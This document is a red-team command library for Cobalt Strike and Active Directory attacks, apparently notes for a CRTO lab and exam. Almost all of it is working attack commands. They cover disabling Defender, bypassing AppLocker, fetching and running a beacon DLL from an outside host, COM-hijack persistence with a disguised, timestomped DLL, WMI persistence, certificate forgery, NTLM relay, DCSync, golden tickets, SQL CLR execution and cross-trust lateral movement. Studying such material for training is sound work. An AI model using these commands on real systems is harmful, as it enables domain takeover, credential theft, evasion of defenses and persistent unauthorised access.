# Red Team Ops & Cobalt Strike Command Library  

## Command Techniques  

## PowerShell  

>Add hosts file entry for internal DNS resolution Attacker desktop OPSEC-🟢SAFE  
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```
>Use Output from `krb_s4u` or `krb_dump` Save kirbi file to Attacker desktop disk OPSEC-🟢SAFE  
>Save and Decode tickets on attacker desktop PowerShell, run before `kerberos_ticket_use`  
```powershell
[System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi", [System.Convert]::FromBase64String("<base64>"))
[System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi", [System.Convert]::FromBase64String("<base64>"))
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))
```
>Save the CA certificate to your attacker desktop.
```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
```
>Use the certificate to force a user certificate for the default domain administrator account OPSEC-🟢SAFE
```powershell
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
```
>Convert a captured PFX certificate through coerce relay to base64 to be use in `Rubeus asktgt`  
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
```
>Disable Antivirus 🛡️ real time monitor scanning OPSEC-🟠CAUTION  
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
>Enumerate AppLocker Policy miss-configurations to use in establishing foothold on initial compromised workstation  
```powershell
# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
$ExecutionContext.SessionState.LanguageMode

# Read all effective rules
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable 💡
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable dirs inside the allowed %WINDIR%\* path
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
```

## PowerView PowerShell  

>OPSEC-🟢SAFE  
>Load PowerView script into `Beacon` Memory, never writes to target  
```cs
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```
>Import PowerView on attacker desktop in `powershell` window
```powershell
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```
>Find principals that have `WriteProperty` privileges on msDS-AllowedToActOnBehalfOfOtherIdentity attribute of computers.
```powershell
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```
>Query LDAP to discover what is a SID 
```
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
```
>PowerView Enumeration commands  
```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 
powerpick Get-Domain
powerpick Get-DomainUser -Properties samaccountname,description
powerpick Get-DomainGroupMember "Domain Admins" -Recurse
```

## RSAT PowerShell  

>AD Enumeration, Run in the `runas` PowerShell window where LDAP ticket cached & RSAT installed on host  
```powershell
Get-ADComputer -Filter * -Server lon-dc-1
# Find existing Resource Based Constrained Delegation (RBCD) config 
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

Get-ADUser -Filter * -Server lon-dc-1
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1

Get-ADOrganizationalUnit -Filter * -Server lon-dc-1

Get-ADGroup -Filter * -Server lon-dc-1
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive

Get-ADTrust -Filter * -Server lon-dc-1

Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
```
>Add new RBCD config between FS and WKSTN, making sure not to overwrite the existing entry.
```powershell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
```

## PowerShell-Import  

>OPSEC-🟠CAUTION
>`WmiPersistence.ps1` load from the beacon using `powershell-import`, then call the function via `psinject`  
>Install WMI subscription triggers on Event 1502 that is a client GPO refresh **Elevated persistence**  
```cs
powershell-import C:\Tools\WmiPersistence.ps1
psinject [BEACON PID] x64 Add-WmiPersistence
```

## Initial Beacon  

>OPSEC-🟢SAFE  
>Beacon sleep 3 seconds jitter 20  
```cs
sleep 3 20
```
>Open Process browser tab current beacon  
```cs
process_browser
```
>spoof parent  
```cs
ppid <explorer.exe PID>
```
>Get User ID  
```cs
getuid
```
>Working Directory  
```cs
pwd
```
>List processes in beacon console  
```cs
ps
```
>Lookup domain controller in the foreign domain.
```cs
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
```

## User Impersonation  

>OPSEC-🟢SAFE
>Impersonated by stealing users Windows access token from that process  
```
steal_token 1234
```
>Kerberos Triage action will output a table of the current user's Kerberos tickets  
```cs
krb_triage
```
>Dump krbtgt for a user, need to be SYSTEM beacon 
```cs
krb_triage
krb_dump /user:rsteel /service:krbtgt
```
>Dump the machine account TGT from high integrity SYSTEM beacon  
```
krb_dump /luid:3e7 /service:krbtgt
```
>In the medium-integrity Beacon running as user, extract user their TGT, no SYSTEM needed  
```cs
krb_tgtdeleg
```
>Drop impersonation when done
```
rev2self
```

## ldapsearch    

>OPSEC-🟢SAFE  
>Enumerate Domain, OUs, GPOs — with ACL data for BloodHound edges  
```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```
>Enumerate Users, computers, groups — with ACL data  
```
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```
>Enumerate and List GPO information
```
ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
```
>Enumerate the Foreign Security Principals Container of the foreign domain for trust abuse.
```cs
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
```
>Obtain the domain SID for the child domain in the forest.
```
ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
```
>Obtain the SID for parent domain's Enterprise Admins group.  
```
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
```
>Enumerate members of the group `Partner Jump Users`.  
```cs
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
```
>Enumerate users + computers + groups in one  
```cs
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
```
>Find groups that grant sysadmin on the SQL server  
```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```
>Enumerate computers  
```cs
ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```
>Enumerate parent child trusts - domain inbound or outbound trust  
```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```
>Enumerate AS-REP roastable, no Kerberos pre-authentication required, can request AS-REP hash without credentials  
```
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
```
>Enumerate Constrained delegation config  
```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```
>Enumerate Unconstrained delegation, any computer/user with unconstrained delegation coerce relay DC to auth to it, capture TGT  
```
ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
```
>Enumerate Domain structure OU and GPO  
```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```

## Beacon File Operations  

>OPSEC-🟢SAFE  
>Secure Copy Beacon Logs to Attacker Desktop, On attacker desktop open Ubuntu tab in Windows Terminal  
```bash
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
```
>Upload payload from attacker desktop to current beacon working directory folder   
```cs
cd C:\Windows\Tasks\
upload C:\Payloads\http_x64.svc.exe
```
>Download the GPO `GptTmpl.inf` Security Template file, define group membership via Group Membership and **sync** file to attacker desktop.
```cs
download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```
>Remove delete payload file
```cs
rm C:\Temp\http_x64.svc.exe
```
>Access C$ via SMB OPSEC-🟢SAFE
```cs
ls \\par-jmp-1.partner.com\c$
```
>Copy certificate back to windows from docker Kali Linux image:
```
docker cp kali-1:/LON-DC-1.pfx C:\Tools\LON-DC-1.pfx
```
>Proof of DA Access
```
ls \\lon-dc-1.contoso.com\C$
```
>File Upload the payload and rename in SYSTEM beacon.
```
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe
```
>Rename and timestomp the DLL to help it blend in with the existing Microsoft Teams files.  
```
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
upload C:\Payloads\http_x64.dll

mv http_x64.dll Microsoft.Teams.HttpClient.dll
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```
>Register entries to perform the COM hijack and maintain basic persistence using Microsoft Teams application  
```powershell
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

## Ubuntu WSL & Kali Linux  

>Parse Logs with BOFHound tool on Ubuntu WSL, Output JSON copy to BloodHound OPSEC-🟢SAFE
```
bofhound -i logs
```
>Build new artifacts in WSL Ubuntu, when clean load `artifact.cna` in Script Manager  
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
>Build Resource Kit templates in WSL Ubuntu  
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```
>Relaying setup via Kali Docker container. Start Kali docker and set proxychains configuration to allow socks commands via CS team server  
```
docker container start -i kali-1

nano /etc/proxychains.conf
# socks5 10.0.0.5 1080

proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
>Ubuntu WSL Terminal, and use `python3 PackMyPayload.py` tool that creates `ISO/IMG/ZIP` containers to package all the files  
```
python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
```

## ThreatCheck & Ghidra  

>Start Ghidra
```
ghidraRun.bat
```
>ThreatCheck AMSI in cobalt strike custom resources template powershell  
```powershell
cd C:\Tools\cobaltstrike\custom-resources\
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```
>ThreatCheck create cobalt strike custom artifacts mailslot exe  
```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```
>Confirms custom artifacts used clean before deploy.
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\WmiPersistence.ps1
```
>Confirm process hollowed with beacon shellcode build in Visual Studio, `Class Library (.NET Framework)` DLL is clean  
```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
```

## Establish Beacon  

>On assume breached compromised workstation of a victim, use `AppDomainHijack.dll` (Process Hollowing) & ngentask  
```powershell
# On foothold workstation — set APPDOMAIN env vars and run ngentask
cd C:\Windows\Tasks\

Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/AppDomainHijack.dll' -OutFile 'C:\Windows\Tasks\AppDomainHijack.dll'
cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks\

$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
```
>Download Beacon DLL to Workstation as user, `Invoke-WebRequest` works in AppLocker `ConstrainedLanguage` policy and execute DLL   
```powershell
cd C:\Windows\Tasks\
Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```
>Connected Beacon Checklist
```
sleep 3 20
ps
process_browser
ls / pwd / drives
ppid <explorer.exe PID>
getuid
netstat 
```

## Rubeus

>OPSEC-🟠CAUTION  
>S4U2Self to impersonate Administrator, use base64 TGT ticket, Request usable service ticket cifs/lon-fs-1  
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
```
>Rubeus use the Kerberos unconstrained delegation to obtain a TGT for current beacon user without needing credentials. run in any beacon  
```cs
spawnto x64 %windir%\sysnative\dllhost.exe
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
```
>Rubeus Obtain HASH value for only mssql_svc account and not triggering honeypot accounts, remain  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```
>In new PowerShell window `runas` Request LDAP Service Ticket and Inject PTT  
```powershell
runas /netonly /user:CONTOSO\pchilds powershell

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```
>klist native Windows command will not show tickets in a `/netonly` session. Use `Rubeus` instead  
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```
>Start Rubeus monitor web server for incoming TGTs via SSPI coerce relay  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```
>Use a certificate to get TGT as target user  
```cs
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```
>Proving Domain Admin Access with the Forged TGT, Inject TGT into beacon session  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
```
>Exploitation On the Attacker Desktop, forge a golden ticket and output to a kirbi file.  
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
```

## kerberos_ticket_use

>OPSEC-🟢SAFE  
>Create sacrificial user logon session and inject user ticket in beacon  
```cs
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```
>Inject HTTP ticket and lateral move via WinRM, Lateral move to par-jmp-1  
```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi

jump winrm64 par-jmp-1.partner.com smb
```
>Inject CIFS ticket and verify  
```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
```
>Golden Ticket, Inject the ticket into the Beacon session replacing the current TGT for sguest.  
```
kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
```

## PowerPick  

>OPSEC-🟠CAUTION  
>Unmanaged PS list kerberos tickets  
```
powerpick klist
```
>Enumerate weak window services where low-priv users have FullControl  
```cs
powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
```
>Windows firewall, Add the rule Port 445 allow inbound in port forward requirement
```cs
powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
```
>Enumerate WMI subscriptions powerpick, no child process   
```cs
powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```
>Find services with unquoted paths containing spaces  
```powershell
powerpick Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^[A-Za-z]:\\Windows\\' } | Select-Object Name, PathName, StartMode, StartName
```


## HashCat

>Hashcat offline hash cracking
```
hashcat -a 0 -m 13100 /hashcat-cracking/cred-acc-challenge.hash /wordlists/rockyou.txt
```

## S4U  

>S4U abuse — get service ticket impersonating Administrator
```
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

## Windows Services  

>OPSEC-🟠CAUTION  
>Record current service configuration  
```cs
sc_stop BadWindowsService
```
>Reconfigure service to point at payload  
```cs
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```
>Start the service  
```cs
sc_start BadWindowsService
```

## KRB_ASKTGT

>OPSEC-🟢SAFE  
>`krb_asktgt` when you have credentials and need a TGT  
>Request a TGT for the trust account using the shared secret in the mimikatz lsadump output  
```cs
krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
```
>Request a TGT for rsteel from CONTOSO KDC  
```cs
krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
```
>Request TGT for rsteel from CONTOSO KDC  
```cs
krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
```

## KRB_ASKTGS  

>OPSEC-🟠CAUTION  
>`krb_asktgs` is for requesting service tickets from a TGT you already have.  
>Request an inter-realm referral ticket  
```cs
krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
```
>Request a CIFS service ticket for par-jmp-1 from PARTNER KDC  
```cs
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com / ticket:<base64-INTER-REALM>
```
>Request CIFS service ticket from PARTNER KDC  
```cs
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```
>Request HTTP service ticket from PARTNER KDC needed for WinRM  
```cs
krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```

## SOCKS Proxy Pivoting Tunnels  

>OPSEC-🟢SAFE  
>Use Beacon to start a SOCKS proxy, then open `Proxifier` and set profile and rule to use beacon as socks proxy  
```
socks 1080 socks5
```
>lanmanserver service disable to prevent it from automatically restarting.
```
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
```
>Start a reverse port forward that will bind to port 445 and redirect the traffic to `127.0.0.1:7445` attacker
```cs
rportfwd_local 445 localhost 7445
```
>Beacon Troubleshooting Stop Socks  
```
socks stop
```
>Cleanup Socks proxy, firewall, services, port forwarding  
```
rportfwd stop 445

sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
sc_start srvnet
sc_start srv2
sc_start lanmanserver

powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
```

## Coerce Relay  

>OPSEC-🟠CAUTION  
>Coerce DC to authenticate to Web Server  
```cs
spawnto x64 %windir%\sysnative\dllhost.exe
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```
>Relay credentials for domain controller, so we request a DomainController certificate. On the Kali Linux Docker instance start `NTLMRelayX`  
```
proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
>In beacon Coerce the domain controller into authenticating to the current machine.
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
```

## SQL  

>OPSEC-🟢SAFE  
>Get information about the DB instance and your current privileges  
```cs
sql-info lon-db-1
```
>confirm SQL sysadmin before proceeding  
```
sql-whoami lon-db-1
```
>Check the status of SQL CLR
```cs
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```
>CLR must be enabled on the SQL instance before it will accept and run assemblies.  
```cs
sql-enableclr lon-db-1
```
>Load the CLR assembly on SQL server and execute the stored procedure.
```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```
>Pipe name is set STATICALLY in Cobalt Strike GUI — Listeners > SMB listener > Pipename (C2) field. NOT set by `post-ex { set pipename }` in the Malleable C2 profile (that controls fork-and-run post-ex pipes only — completely separate).  
>Run `link` from the SQL user beacon only, not from any impersonated session — needs a valid TGT in session to auto-request CIFS ticket.  
>Lab default pipe name (original course value): `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`  
>Exam2 custom pipe name (set in GUI SMB listener): `dotnet-diagnost-6845-ceeb-b00b-63676827406`  
```cs
// LAB (London SQL)
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
// EXAM2 (Dublin SQL) — use your configured SMB listener pipe name
link dub-sql-1 dotnet-diagnost-6845-ceeb-b00b-63676827406
```
>Show all SQL linked servers configured on lon-db-1
```cs
sql-links lon-db-1
```
>Check your privilege level on lon-db-2 via the link
```cs
sql-whoami lon-db-1 "" lon-db-2
```
>Check and Enable RPC Out on the link, required for CLR execution
```cs
sql-checkrpc lon-db-1
sql-enablerpc lon-db-1 lon-db-2
```
>Execute CLR payload on lon-db-2 via the SQL link
```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```
>Exploit SeImpersonatePrivilege with SweetPotato and connect new beacon
```cs
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
connect localhost 1337
```

## Certify  

>OPSEC-🟠CAUTION  
>ADCS ESC enumeration  
```cs
execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable
```
>Enumerate vulnerable templates only, suppress admin-only findings  
```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```
>ESC1, Misconfigured Client Authentication Templates, request cert specify UPN in SAN
```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```
>On CA server Dump the CA's certificate 
```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
```

## SpawnTo  

>`spawnto x64 <path>` Post-Ex Fork & Run Sets the sacrificial process for the current beacon session. Affects every fork & run operation that beacon performs: `execute-assembly`,`powerpick`. overrides whatever `spawnto_x64` is set in your **Malleable C2 profile** post-ex block current beacon only  
```
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```
>`ak-settings spawnto_x64 <path>` Artifact Kit Service Binary Sets the spawnto baked into service EXE payloads generated by the Artifact Kit. Affects:
  `jump scshell64` lateral move  
```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

## DCSync  

>OPSEC-🟠CAUTION  
>Credential ticket harvest  
```cs
dcsync contoso.com CONTOSO\Administrator
```
>requires DA or replication privileges, cannot get there from a user beacon  
```cs
dcsync contoso.com CONTOSO\krbtgt
```
>DCSync rsteel AES256 hash  
```cs
dcsync contoso.com CONTOSO\rsteel
```

## JUMP  

>Preferred JUMP method, `scshell64` uses the service binary payload, be sure to set the `ak-settings spawnto_x64` before JUMP.  
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```
>Jump to target with WinRM, no service modification, no disk write  
>Using WinRM to create new beacon  
```cs
jump winrm64 lon-dc-1.contoso.com smb
jump winrm64 lon-ws-1 smb
```

## Execute    

>OPSEC-🔴UNSAFE
>Trigger GPO refresh to test persistence fires spawns `gpupdate.exe` child process   
```cs
execute gpupdate /target:computer /force
```

## Get System  

>OPSEC-🔴UNSAFE
>if SYSTEM privilege escalation needed  
```cs
getsystem
```

## Mimikatz  

>OPSEC-🔴UNSAFE  
>DCSync shared inter-realm key from the TDO  Trust Domain Object  
```
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

# CRTO Lab Commands

>Outbound Trusts  
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com

ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
```

>Inbound Trusts
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName

nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV

ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath

download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf

ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName

dcsync contoso.com CONTOSO\rsteel

krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
ls \\\\par-jmp-1.partner.com\\c$
```

>Parent Child Trusts
```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
